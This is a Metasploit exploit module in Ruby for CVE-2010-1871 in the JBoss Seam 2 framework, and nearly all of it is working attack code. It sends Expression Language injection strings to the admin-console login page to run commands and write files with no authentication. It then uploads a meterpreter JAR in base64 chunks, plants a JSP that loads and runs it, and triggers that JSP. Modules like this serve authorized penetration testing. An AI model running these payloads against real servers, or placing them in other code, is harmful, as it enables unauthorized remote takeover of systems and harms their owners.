#
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'rex/proto/http'
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking

    include Msf::Exploit::Remote::HttpClient
    include Msf::Auxiliary::Report
    include Msf::Exploit::FileDropper


    def initialize(info = {})
        super(update_info(info,
        'Name'                  => 'JBoss Seam 2 File Upload and Execute',
        'Description'   => %q{
            Versions of the JBoss Seam 2 framework  < 2.2.1CR2 fails to properly
            sanitize inputs to some JBoss Expression Language expressions.  As a
            result, attackers can gain remote code execution through the
            application server.  This module leverages RCE to upload and execute
            a meterpreter payload.

            Versions of the JBoss AS admin-console are known to be vulnerable to
            this exploit, without requiring authentication.  Tested against
            JBoss AS 5 and 6, running on Linux with JDKs 6 and 7.

            This module provides a more efficient method of exploitation - it
            does not loop to find desired Java classes and methods.

            NOTE: the check for upload success is not 100% accurate.
            NOTE 2: The module uploads the meterpreter JAR and a JSP to launch
            it.

        },
        'Author'                => [ 'vulp1n3 <vulp1n3[at]gmail.com>' ],
        'References'            =>
        [
            # JBoss EAP 4.3.0 does not properly sanitize JBoss EL inputs
            ['CVE', '2010-1871'],
            ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=615956'],
            ['URL', 'http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html'],
            ['URL', 'http://archives.neohapsis.com/archives/bugtraq/2013-05/0117.html']
        ],
        'DisclosureDate' => "Aug 05 2010",
        'License'               => MSF_LICENSE,
        'Platform'              => %w{ java },
        'Targets'               =>
        [
            [ 'Java Universal',
                {
                    'Arch' => ARCH_JAVA,
                    'Platform' => 'java'
                },
            ]
        ],
        'DefaultTarget'       => 0
        ))

        register_options(
        [
            Opt::RPORT(8080),
            OptString.new('AGENT',  [ true,  "User-Agent to send with requests", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"]),
            OptString.new('CTYPE',  [ true,  "Content-Type to send with requests", "application/x-www-form-urlencoded"]),
            OptString.new('TARGETURI',  [ true,  "URI that is built on JBoss Seam 2", "/admin-console/login.seam"]),
            OptInt.new('TIMEOUT', [ true, 'Timeout for web requests', 10]),
            OptString.new('FNAME',  [ false,  "Name of file to create - NO EXTENSION! (default: random)", nil]),
            OptInt.new('CHUNKSIZE', [ false, 'Size in bytes of chunk per request', 1024]),
        ], self.class)
    end


    def check
        vprint_status("#{rhost}:#{rport} Checking for vulnerable JBoss Seam 2")
        uri = target_uri.path
        res = send_request_cgi(
        {
            'uri'       => normalize_uri(uri),
            'method'    => 'POST',
            'ctype'     => datastore['CTYPE'],
            'agent'     => datastore['AGENT'],
            'data' => "actionOutcome=/success.xhtml?user%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime')}"
        }, timeout=datastore['TIMEOUT'])
        if (res and res.code == 302 and res.headers['Location'])
            vprint_debug("Server sent a 302 with location")
            if (res.headers['Location'] =~ %r(public\+static\+java\.lang\.Runtime\+java.lang.Runtime.getRuntime\%28\%29))
                report_vuln({
                    :host => rhost,
                    :port => rport,
                    :name => "#{self.name} - #{uri}",
                    :refs => self.references,
                    :info => "Module #{self.fullname} found vulnerable JBoss Seam 2 resource."
                })
                return Exploit::CheckCode::Vulnerable
            else
                return Exploit::CheckCode::Safe
            end
        else
            return Exploit::CheckCode::Unknown
        end

        # If we reach this point, we didn't find the service
        return Exploit::CheckCode::Unknown
    end


    def execute_cmd(cmd)
        cmd_to_run = Rex::Text.uri_encode(cmd)
        vprint_status("#{rhost}:#{rport} Sending command: #{cmd_to_run}")
        uri = target_uri.path
        res = send_request_cgi(
        {
            'uri'       => normalize_uri(uri),
            'method'    => 'POST',
            'ctype'     => datastore['CTYPE'],
            'agent'     => datastore['AGENT'],
            'data' => "actionOutcome=/success.xhtml?user%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(expressions.getClass().forName('java.lang.Runtime')).exec('#{cmd_to_run}')}"
        }, timeout=datastore['TIMEOUT'])
        if (res and res.code == 302 and res.headers['Location'])
            if (res.headers['Location'] =~ %r(user=java.lang.UNIXProcess))
                vprint_status("#{rhost}:#{rport} Exploit successful")
            else
                vprint_status("#{rhost}:#{rport} Exploit failed.")
            end
        else
            vprint_status("#{rhost}:#{rport} Exploit failed.")
        end
    end


    def call_jsp(jspname)
        # TODO ugly way to strip off last resource on a path
        uri = target_uri.path
        *keep,ignore = uri.split(/\//)
        keep.push(jspname)
        uri = keep.join("/")
        uri = "/" + uri if (uri[0] != "/")

        res = send_request_cgi(
        {
            'uri'       => normalize_uri(uri),
            'method'    => 'POST',
            'ctype'     => datastore['CTYPE'],
            'agent'     => datastore['AGENT'],
            'data' => "sessionid=" + Rex::Text.rand_text_alpha(32)
        }, timeout=datastore['TIMEOUT'])
        if (res and res.code == 200)
            vprint_status("Successful request to JSP")
        else
            vprint_error("Failed to request JSP")
        end
    end


    def upload_jsp(filename,jarname)
        jsp_text = <<EOJSP
<%@ page import="java.io.*"
%><%@ page import="java.net.*"
%><%
URLClassLoader cl = new java.net.URLClassLoader(new java.net.URL[]{new java.io.File(request.getRealPath("/#{jarname}")).toURI().toURL()});
Class c = cl.loadClass("metasploit.Payload");
c.getMethod("main",Class.forName("[Ljava.lang.String;")).invoke(null,new java.lang.Object[]{new java.lang.String[0]});
%>
EOJSP
        vprint_status("Uploading JSP to launch payload")
        status = upload_file_chunk(filename,'false',jsp_text)
        if status
            vprint_status("JSP uploaded to to #{filename}")
        else
            vprint_error("Failed to upload file.")
        end

        @pl_sent = true
    end


    def upload_file_chunk(filename, append='false', chunk)
        # create URL-safe Base64-encoded version of chunk
        b64 = Rex::Text.encode_base64(chunk)
        b64 = b64.gsub("+","%2b")
        b64 = b64.gsub("/","%2f")

        uri = target_uri.path
        res = send_request_cgi(
        {
            'uri'       => normalize_uri(uri),
            'method'    => 'POST',
            'ctype'     => datastore['CTYPE'],
            'agent'     => datastore['AGENT'],
            'data' => "actionOutcome=/success.xhtml?user%3d%23{expressions.getClass().forName('java.io.FileOutputStream').getConstructor('java.lang.String',expressions.getClass().forName('java.lang.Boolean').getField('TYPE').get(null)).newInstance(request.getRealPath('/#{filename}').replaceAll('\\\\\\\\','/'),#{append}).write(expressions.getClass().forName('sun.misc.BASE64Decoder').getConstructor(null).newInstance(null).decodeBuffer(request.getParameter('c'))).close()}&c=" + b64
        }, timeout=datastore['TIMEOUT'])
        if (res and res.code == 302 and res.headers['Location'])
            # TODO Including the conversationId part in this regex might cause
            # failure on other Seam applications.  Needs more testing
            if (res.headers['Location'] =~ %r(user=&conversationId))
                #vprint_status("#{rhost}:#{rport} Exploit successful.")
                return true
            else
                #vprint_status("#{rhost}:#{rport} Exploit failed.")
                return false
            end
        else
            #vprint_status("#{rhost}:#{rport} Exploit failed.")
            return false
        end
    end


    def get_full_path(filename)
        #vprint_debug("Trying to find full path for #{filename}")

        uri = target_uri.path
        res = send_request_cgi(
        {
            'uri'       => normalize_uri(uri),
            'method'    => 'POST',
            'ctype'     => datastore['CTYPE'],
            'agent'     => datastore['AGENT'],
            'data' => "actionOutcome=/success.xhtml?user%3d%23{request.getRealPath('/#{filename}').replaceAll('\\\\\\\\','/')}"
        }, timeout=datastore['TIMEOUT'])
        if (res and res.code == 302 and res.headers['Location'])
            # the user argument should be set to the result of our call - which
            # will be the full path of our file
            matches = /.*user=(.+)\&.*/.match(res.headers['Location'])
            #vprint_debug("Location is " + res.headers['Location'])
            if (matches and matches.captures)
                return Rex::Text::uri_decode(matches.captures[0])
            else
                return nil
            end
        else
            return nil
        end
  end


    def java_stager(fname, chunk_size)
        @payload_exe = fname + ".jar"
        jsp_name = fname + ".jsp"

        #data = payload.encoded_jar.pack
        data = payload.encoded_jar.pack

        append = 'false'
        while (data.length > chunk_size)
            status = upload_file_chunk(@payload_exe, append, data[0, chunk_size])
            if status
                vprint_debug("Uploaded chunk")
            else
                vprint_error("Failed to upload chunk")
                break
            end
            data = data[chunk_size, data.length - chunk_size]
            # first chunk is an overwrite, afterwards, we need to append
            append = 'true'
        end
        status = upload_file_chunk(@payload_exe, 'true', data)
        if status
            vprint_status("Payload uploaded to " + @payload_exe)
        else
            vprint_error("Failed to upload file.")
        end

        # write a JSP that can call the payload in the jar
        upload_jsp(jsp_name, @payload_exe)

        pe_path = get_full_path(@payload_exe) || @payload_exe
        jsp_path = get_full_path(jsp_name) || jsp_name
        # try to clean up our stuff;
        register_files_for_cleanup(pe_path, jsp_path)

        # call the JSP to launch the payload
        call_jsp(jsp_name)
    end

    def exploit
        @pl_sent = false

        if check == Exploit::CheckCode::Vulnerable

            fname = datastore['FNAME'] || Rex::Text.rand_text_alpha(8+rand(8))

            vprint_status("#{rhost}:#{rport} Host is vulnerable")
            vprint_status("#{rhost}:#{rport} Uploading file...")

            # chunking code based on struts_code_exec_exception_delegator
            append = 'false'
            chunk_size = datastore['CHUNKSIZE']
            # sanity check
            if (chunk_size <= 0)
                vprint_error("Invalid chunk size #{chunk_size}")
                return
            end

            vprint_debug("Sending in chunks of #{chunk_size}")

            case target['Platform']
            when 'java'
                java_stager(fname, chunk_size)
            else
                fail_with(Failure::NoTarget, 'Unsupported target platform!')
            end

            handler
        end
    end
end
